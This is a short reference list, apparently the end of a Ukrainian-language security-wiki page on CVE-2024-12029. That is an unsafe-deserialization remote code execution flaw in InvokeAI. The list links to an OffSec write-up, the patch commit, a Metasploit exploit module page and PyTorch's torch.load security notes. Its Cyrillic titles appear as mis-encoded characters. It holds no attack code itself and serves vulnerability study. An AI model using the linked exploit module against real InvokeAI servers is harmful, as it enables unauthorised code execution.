- [OffSec –±–ª–æ–≥ ‚Äì "CVE-2024-12029 ‚Äì InvokeAI –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –Ω–µ–Ω–∞–¥—ñ–π–Ω–∏—Ö –¥–∞–Ω–∏—Ö"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI –ø–∞—Ç—á –∫–æ–º—ñ—Ç 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—è –º–æ–¥—É–ª—è Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì –ø–∏—Ç–∞–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ –¥–ª—è torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
